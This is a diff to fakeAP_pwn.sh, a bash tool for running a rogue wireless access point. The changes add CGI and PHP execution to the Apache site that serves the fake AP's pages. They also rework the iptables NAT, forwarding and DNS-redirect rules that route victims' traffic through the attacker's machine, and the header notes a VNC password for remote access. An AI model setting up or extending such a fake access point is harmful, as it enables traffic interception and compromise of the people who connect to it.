@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh (v0.3-RC39 2010-07-18)                                                         #
+# fakeAP_pwn.sh (v0.3-RC45 2010-07-21)                                                         #
 #---Important----------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -50,7 +50,7 @@ if [ "$APtype" == "airbase-ng" ] ; then
 else
   whichinterface=$wifiInterface
 fi
-export   version="0.3-RC39"
+export   version="0.3-RC45"
 trap 'cleanup interrupt' 2 # Interrupt - "Ctrl + C"
 #----Functions---------------------------------------------------------------------------------#
 function cleanup() {
@@ -211,6 +211,7 @@ fi
 if [ "$(id -u)" != "0" ]; then echo -e "\e[00;31m[-]\e[00m Not a superuser." 1>&2; cleanup; fi
 
 if [ "$apMode" != "non" ]; then
+   ifconfig $interface down && ifconfig $interface up 
    command=$(ifconfig | grep $interface | awk '{print $1}')
    if [ "$command" != "$interface" ]; then
       echo -e "\e[00;31m[-]\e[00m The gateway interface $interface, isn't correct." 1>&2
@@ -660,6 +661,13 @@ echo "<VirtualHost *:80>
 		Order allow,deny
 		allow from all
 	</Directory>
+	ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
+        <directory \"/usr/lib/cgi-bin\">
+                AllowOverride None
+                Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
+                Order allow,deny
+                Allow from all
+        </directory>
 	ErrorLog /var/log/apache2/fakeAP_pwn-error.log
 	LogLevel warn
 	CustomLog /var/log/apache2/fakeAP_pwn-access.log combined
@@ -681,6 +689,12 @@ echo "<VirtualHost *:80>
 		Order allow,deny
 		allow from all
 	</Directory>
+        <directory \"/usr/lib/cgi-bin\">
+                AllowOverride None
+                Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
+                Order allow,deny
+                Allow from all
+        </directory>
 	ErrorLog /var/log/apache2/error.log
 	LogLevel warn
 	CustomLog /var/log/apache2/ssl_fakeAP_pwn-access.log combined
@@ -799,11 +813,9 @@ if [ $command != "1" ]; then
   cleanup
 fi
 if [ "$apMode" == "transparent" ] || [ "$apMode" == "normal" ]; then
-   iptables --table nat --append POSTROUTING -s 10.0.0.0/24 --out-interface $interface --jump MASQUERADE     # ...and send it on to the internet (for now, we will redirct later (once we are ready!))
-   iptables -A FORWARD -s 10.0.0.0/24 -o $interface -j ACCEPT
-   iptables -A FORWARD -d 10.0.0.0/24 -m conntrack --ctstate ESTABLISHED,RELATED -i $interface -j ACCEPT
-   iptables --append FORWARD --in-interface $whichinterface --jump ACCEPT                                 # Get everything on the fakeAP # Allow at0 interface connections to be forwarded through other interfaces
-   iptables --table nat --append PREROUTING --proto udp --destination-port 53 --jump DNAT --to $gatewayIP           # Change destination addresses to the connection with internet (for DNS)
+   iptables --table nat --append POSTROUTING --out-interface $interface --jump MASQUERADE   # ...and send it on to the internet (for now, we will redirct later (once we are ready!))
+   iptables --append FORWARD --in-interface $whichinterface --jump ACCEPT                              # Get everything on the fakeAP # Allow at0 interface connections to be forwarded through other interfaces
+   iptables --table nat --append PREROUTING --proto udp --destination-port 53 --jump DNAT --to $gatewayIP         # Change destination addresses to the connection with internet (for DNS)
 elif [ "$apMode" == "non" ]; then
    iptables --table nat --append PREROUTING --in-interface $whichinterface --jump REDIRECT                # Blackhole Routing - will redirect all network traffic on the AP interface back to the system. (cache)
 fi
@@ -854,7 +866,7 @@ fi
 #----------------------------------------------------------------------------------------------#
    echo -e "\e[01;32m[>]\e[00m Starting Web server..."
    if [ "$verbose" == "2" ] ; then echo "Command: /etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && /etc/init.d/apache2 reload"; fi
-   $xterm -geometry 75x10+100+0 -T "fakeAP_pwn v$version - Web Sever" -e "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && /etc/init.d/apache2 reload" & #dissable all sites and only enable the fakeAP_pwn one
+   $xterm -geometry 75x10+100+0 -T "fakeAP_pwn v$version - Web Sever" -e "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && a2enmod php5 && /etc/init.d/apache2 reload" & #dissable all sites and only enable the fakeAP_pwn one
    sleep 2
    if [ -z "$(pgrep apache2)" ]; then
       echo -e "\e[00;31m[-]\e[00m Apache2 failed to start." 1>&2
